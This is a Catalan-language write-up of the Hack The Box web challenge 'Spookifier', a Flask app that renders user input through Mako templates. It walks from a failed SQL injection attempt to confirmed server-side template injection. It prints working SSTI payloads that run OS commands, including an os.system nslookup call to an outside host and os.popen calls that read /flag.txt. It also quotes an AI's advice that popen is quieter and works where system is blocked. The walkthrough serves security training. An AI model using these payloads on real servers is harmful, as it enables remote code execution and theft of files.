Aquest repte és un repte web, per tant, el primer que hem de fer és connectar-nos a la pàgina web del repte. L'objectiu com sempre serà trobar la flag del challenge:

![image](https://github.com/user-attachments/assets/1a5f93b2-d02e-4ab4-aeea-f1c70ede7bdb)


El que ens trobem és una pàgina web on podem posar el nostre nom o el nom que volem i veiem com ens el tradueix o mostra en el que sembla ser vàries tipografies diferents:

![image](https://github.com/user-attachments/assets/59bfe8af-d226-4630-8f4c-f30bcf7c6b84)


El primer que veig és que el nom es passa per URL, per tant sembla que podríem intentar fer un atac de injecció de SQL. No hi ha hagut èxit després de varis intents:

![image](https://github.com/user-attachments/assets/8bddf595-f2d7-4a57-ac54-ba6d86c0943c)


Ara per tant, vaig a descarregar el fitxer que hi ha a HTB d'aquest challenge, ja que no només hi ha una web, si no que també hi ha un fitxer:

![image](https://github.com/user-attachments/assets/3da6a52e-4211-49ee-b4b1-4a771b21ae85)


Al descarregar el fitxer comprimit i descomprimir-lo, ens trobem que hi ha els següents directoris i fitxers a dins:

```
┌──(kali㉿kali)-[~/Documents/Spookifier/web_spookifier]
└─$ ls -lah
total 28K
drwxrwxr-x 4 kali kali 4.0K Nov  1  2022 .
drwxrwxr-x 3 kali kali 4.0K Apr  2 07:57 ..
-rwxrwxr-x 1 kali kali  649 Nov  1  2022 Dockerfile
-rwxrwxr-x 1 kali kali  140 Nov  1  2022 build-docker.sh
drwxrwxr-x 3 kali kali 4.0K Nov  1  2022 challenge
drwxrwxr-x 2 kali kali 4.0K Nov  1  2022 config
-rwxrwxr-x 1 kali kali   26 Nov  1  2022 flag.txt

```

El primer que fem és mirar el fitxer que es diu flag.txt:

```
`┌──(kali㉿kali)-[~/Documents/Spookifier/web_spookifier]
└─$ cat flag.txt                                                                                          
HTB{f4k3_fl4g_f0r_t3st1ng}   `
```                        

Com era d'esperar és un trolleo, no és la flag.

Anem a mirar el dockerfile, a veure què hi ha:
````
┌──(kali㉿kali)-[~/Documents/Spookifier/web_spookifier]
└─$ cat Dockerfile 
FROM python:3.8-alpine

RUN apk add --no-cache --update supervisor gcc
# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask==2.0.0 mako flask_mako Werkzeug==2.0.0

# Copy flag
COPY flag.txt /flag.txt

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# start supervisord
ENTRYPOINT ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"] 




````

Interessant, aquí veiem com s'aixeca l'aplicació web que hem vist al port 1337 (a l'script en bash que aixeca el contenidor també):

```
┌──(kali㉿kali)-[~/Documents/Spookifier/web_spookifier]
└─$ cat build-docker.sh 
#!/bin/bash
docker rm -f web_spookfier
docker build --tag=web_spookfier .
docker run -p 1337:1337 --rm --name=web_spookfier web_spookfier 
``` 

i com es copia la flag.txt a l'arrel del contenidor, per tant sabem on hem d'anar a buscar la flag, que aquesta sí que ha de ser la bona! Per tant hem de trobar alguna forma de poder llegir-la. Revisaré amb profunditat tots els fitxers i directoris que hem descomprimit a veure si trobo alguna cosa interessant.

Hi ha un fitxer a /home/kali/Documents/Spookifier/web_spookifier/challenge/application/util.py que té informació interessant, de fet, és el fitxer que fa funcionar l'aplicació, o sigui és el codi:

```
from mako.template import Template

font1 = {
        'A': '𝕬',
        'B': '𝕭',
        'C': '𝕮',
        'D': '𝕯',
        'E': '𝕰',
        'F': '𝕱',
        'G': '𝕲',
        'H': '𝕳',
        'I': '𝕴',
        'J': '𝕵',
        'K': '𝕶',
        'L': '𝕷',
        'M': '𝕸',
        'N': '𝕹',
        'O': '𝕺',
        'P': '𝕻',
        'Q': '𝕼',
        'R': '𝕽',
        'S': '𝕾',
        'T': '𝕿',
        'U': '𝖀',
        'V': '𝖁',
        'W': '𝖂',
        'X': '𝖃',
        'Y': '𝖄',
        'Z': '𝖅',
        'a': '𝖆',
        'b': '𝖇',
        'c': '𝖈',
        'd': '𝖉',
        'e': '𝖊',
        'f': '𝖋',
        'g': '𝖌',
        'h': '𝖍',
        'i': '𝖎',
        'j': '𝖏',
        'k': '𝖐',
        'l': '𝖑',
        'm': '𝖒',
        'n': '𝖓',
        'o': '𝖔',
        'p': '𝖕',
        'q': '𝖖',
        'r': '𝖗',
        's': '𝖘',
        't': '𝖙',
        'u': '𝖚',
        'v': '𝖛',
        'w': '𝖜',
        'x': '𝖝',
        'y': '𝖞',
        'z': '𝖟',
        ' ': ' '
}

font2 = {
        'A': 'ᗩ', 
        'B': 'ᗷ',
        'C': 'ᑢ',
        'D': 'ᕲ',
        'E': 'ᘿ',
        'F': 'ᖴ',
        'G': 'ᘜ',
        'H': 'ᕼ',
        'I': 'ᓰ',
        'J': 'ᒚ',
        'K': 'ᖽᐸ',
        'L': 'ᒪ',
        'M': 'ᘻ',
        'N': 'ᘉ',
        'O': 'ᓍ',
        'P': 'ᕵ',
        'Q': 'ᕴ',
        'R': 'ᖇ',
        'S': 'S',
        'T': 'ᖶ',
        'U': 'ᑘ',
        'V': 'ᐺ',
        'W': 'ᘺ',
        'X': '᙭',
        'Y': 'Ɏ',
        'Z': 'Ⱬ',
        'a': 'ᗩ', 
        'b': 'ᗷ',
        'c': 'ᑢ',
        'd': 'ᕲ',
        'e': 'ᘿ',
        'f': 'ᖴ',
        'g': 'ᘜ',
        'h': 'ᕼ',
        'i': 'ᓰ',
        'j': 'ᒚ',
        'k': 'ᖽᐸ',
        'l': 'ᒪ',
        'm': 'ᘻ',
        'n': 'ᘉ',
        'o': 'ᓍ',
        'p': 'ᕵ',
        'q': 'ᕴ',
        'r': 'ᖇ',
        's': 'S',
        't': 'ᖶ',
        'u': 'ᑘ',
        'v': 'ᐺ',
        'w': 'ᘺ',
        'x': '᙭',
        'y': 'Ɏ',
        'z': 'Ⱬ',

        ' ': ' '
}

font3 = {
        'A': '₳', 
        'B': '฿',
        'C': '₵',
        'D': 'Đ',
        'E': 'Ɇ',
        'F': '₣',
        'G': '₲',
        'H': 'Ⱨ',
        'I': 'ł',
        'J': 'J',
        'K': '₭',
        'L': 'Ⱡ',
        'M': '₥',
        'N': '₦',
        'O': 'Ø',
        'P': '₱',
        'Q': 'Q',
        'R': 'Ɽ',
        'S': '₴',
        'T': '₮',
        'U': 'Ʉ',
        'V': 'V',
        'W': '₩',
        'X': 'Ӿ',
        'Y': 'y',
        'Z': 'z',
        'a': '₳', 
        'b': '฿',
        'c': '₵',
        'd': 'Đ',
        'e': 'Ɇ',
        'f': '₣',
        'g': '₲',
        'h': 'Ⱨ',
        'i': 'ł',
        'j': 'J',
        'k': '₭',
        'l': 'Ⱡ',
        'm': '₥',
        'n': '₦',
        'o': 'Ø',
        'p': '₱',
        'q': 'Q',
        'r': 'Ɽ',
        's': '₴',
        't': '₮',
        'u': 'Ʉ',
        'v': 'V',
        'w': '₩',
        'x': 'Ӿ',
        'y': 'y',
        'z': 'z',
        ' ': ''
} 

font4 = {
        'A': 'A', 
        'B': 'B',
        'C': 'C',
        'D': 'D',
        'E': 'E',
        'F': 'F',
        'G': 'G',
        'H': 'H',
        'I': 'I',
        'J': 'J',
        'K': 'K',
        'L': 'L',
        'M': 'M',
        'N': 'N',
        'O': 'O',
        'P': 'P',
        'Q': 'Q',
        'R': 'R',
        'S': 'S',
        'T': 'T',
        'U': 'U',
        'V': 'V',
        'W': 'W',
        'X': 'X',
        'Y': 'Y',
        'Z': 'Z',
        'a': 'a', 
        'b': 'b',
        'c': 'c',
        'd': 'd',
        'e': 'e',
        'f': 'f',
        'g': 'g',
        'h': 'h',
        'i': 'i',
        'j': 'j',
        'k': 'k',
        'l': 'l',
        'm': 'm',
        'n': 'n',
        'o': 'o',
        'p': 'p',
        'q': 'q',
        'r': 'r',
        's': 's',
        't': 't',
        'u': 'u',
        'v': 'v',
        'w': 'w',
        'x': 'x',
        'y': 'y',
        'z': 'z',
        '1': '1',
        '2': '2',
        '3': '3',
        '4': '4',
        '5': '5',
        '6': '6',
        '7': '7',
        '8': '8',
        '9': '9',
        '0': '0',
        '!': '!',
        '@': '@',
        '#': '#',
        '$': '$',
        '%': '%',
        '^': '^',
        '&': '&',
        '*': '*',
        '(': '(',
        ')': ')',
        '-': '-',
        '_': '_',
        '+': '+',
        '=': '=',
        '{': '{',
        '}': '}',
        '[': '[',
        ']': ']',
        '\\': '\\',
        '|': '|',
        ';': ';',
        ':': ':',
        '\'': '\'',
        '"': '"',
        '<': '<',
        ',': ',',
        '>': '>',
        '.': '.',
        '?': '?',
        '/': '/'
        ' ': ' ',
}

def generate_render(converted_fonts):
        result = '''
                <tr>
                        <td>{0}</td>
        </tr>
        
                <tr>
                <td>{1}</td>
        </tr>
        
                <tr>
                <td>{2}</td>
        </tr>
        
                <tr>
                <td>{3}</td>
        </tr>

        '''.format(*converted_fonts)

        return Template(result).render()

def change_font(text_list):
        text_list = [*text_list]
        current_font = []
        all_fonts = []

        add_font_to_list = lambda text,font_type : (
                [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
                ) and None

        add_font_to_list(text_list, 'font1')
        add_font_to_list(text_list, 'font2')
        add_font_to_list(text_list, 'font3')
        add_font_to_list(text_list, 'font4')

        return all_fonts

def spookify(text):
        converted_fonts = change_font(text_list=text)

        return generate_render(converted_fonts=converted_fonts)

````

Analitzant-ho, veiem que el fitxer `util.py` conté:

1. **Diccionaris de fonts**:
    
    - `font1`: Utilitza caràcters Unicode de lletres fraktur (estil gòtic)
        
    - `font2`: Utilitza caràcters Unicode que semblen lletres modificades
        
    - `font3`: Utilitza caràcters Unicode de símbols monetaris i lletres modificades
        
    - `font4`: És la font normal sense canvis
        
2. **Funcions principals**:
    
    - `change_font()`: Transforma el text d'entrada en les 4 versions diferents
        
    - `generate_render()`: Genera el codi HTML per mostrar els resultats en una taula
        
    - `spookify()`: Funció principal que coordina tot el procés

Al principi de tot també s'importa una llibreria anomenada Template de mako.template i també la funció generate_render retorna Template, per tant sembla que per aquí va la cosa.

Després de força estona i no trobar res, provarem anant al repo que tinc guardat, el PayloadsAllTheThings a veure si trobem algun payload que ens pugui ser útil per template i el provarem d'injectar, ja que no ha funcionat la injecció SQL ni la recerca feta als directoris i fitxers:

![image](https://github.com/user-attachments/assets/0df19a93-a4ad-4290-a07e-af6bb83c9afc)


I després de rebuscar una mica veiem que hem d'anar al repo de Server Side Template Injection on hi ha una imatge i hi apareix Mako:

![image](https://github.com/user-attachments/assets/adbabe07-0b34-47be-8d4e-72df4963cb39)


La pista està en el missatge següent del repo:

In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability:

```
${{<%[%'"}}%\.
```

I provem la comanda a l'eina web i efectivament dona error, per tant hi ha en principi una vulnerabilitat de SSTI:

![image](https://github.com/user-attachments/assets/af483d88-946a-4e47-95fd-bdf2639b3815)


![image](https://github.com/user-attachments/assets/a22f60f8-2c3c-484a-9c14-bb7edfadc500)


I hi ha una URL al repo que és aquesta: https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756

![image](https://github.com/user-attachments/assets/2b9d2602-77bd-4345-ad61-f0818afda45e)


Que és la que agafarem per trobar una injecció que ens serveixi per el nostre cas que és un template Mako. Un cop a la pàgina trobem la següent:

![image](https://github.com/user-attachments/assets/863ed305-5fa6-409a-a6e4-5a10f76db929)


``${self.__init__.__globals__['util'].os.system('nslookup oastify.com')}``


Ara es tracta d'adatparla per llegir la flag del directori arrel. No m'ha funcionat, he vist que hi ha més payloads al repo per Mako, aquí:

![image](https://github.com/user-attachments/assets/a7dc9760-7252-461f-a84b-a6de63e21a3b)


Ara, serà qüestió de provar-los i a veure quin ens funciona. 

RES.

Després de donar MOLTES voltes sobre aquests payloads, veig que sembla que podria utilitzar popen ja que el que vull és veure el contingut del fitxer i per tant obrir-lo:

![image](https://github.com/user-attachments/assets/9576cb75-0e6d-44ee-9488-ce0ef1673db8)


I li pregunta a una IA el mètode popen respecte al mètode system a veure què li sembla:

El mètode **`os.popen()`** és una bona alternativa a `os.system()` per executar comandes i **capturar-ne la sortida** directament al template. És útil quan:

1. **Necessites veure el resultat** de la comanda (no només executar-la).
    
2. El servidor bloqueja `os.system()` però permet `popen()`.
    
3. Vols evitar limitacions de buffering o redirecció.

Llavors sembla que aquest és el camí. I utilitzarem llavors el payload que hem vist a la captura de pantalla anterior:

```
<%
import os
x=os.popen('id').read()
%>
${x}
```

Que el que fa és:

1. `<% ... %>` és un _script block_ de Mako (executa codi Python directament).
    
2. `os.popen('id').read()` executa la comanda i en llegeix l'output.
    
3. `${x}` injecta el resultat al HTML.
    

I ens serà molt més útil que system ja que:

- **Retorna l'output** (no cal redireccionar a un fitxer).
    
- **Més silenciós**: No mostra errors ni codis de retorn.
    
- **Funciona en entorns restringits** on `system()` està bloquejat.

Per tant, després de generar el payload i provar-lo amb la comanda ``id`` sembla que funciona:

``${__import__('os').popen('id').read()}``

![image](https://github.com/user-attachments/assets/2cec474c-49cc-47e5-81da-d36fce8adb4f)
]


Ara, intentarem llegir el contingut de la flag que es troba al directori arrel.

Després d'un parell d'intents he trobat com fer-ho:

``${__import__('os').popen('cat /flag.txt').read()}``

![image](https://github.com/user-attachments/assets/6d9971fa-c2cf-4bda-80ad-23ab898e4b3e)


I clicant al botó Spookify obtenim la flag:

![image](https://github.com/user-attachments/assets/d71be281-7732-4983-abe4-924c96558aca)


Que ara ja podem anar a posar a HTB, i així tindrem el Challenge completat!!!

![image](https://github.com/user-attachments/assets/a6d30e4a-d456-4707-a4e9-552e4fa90da5)


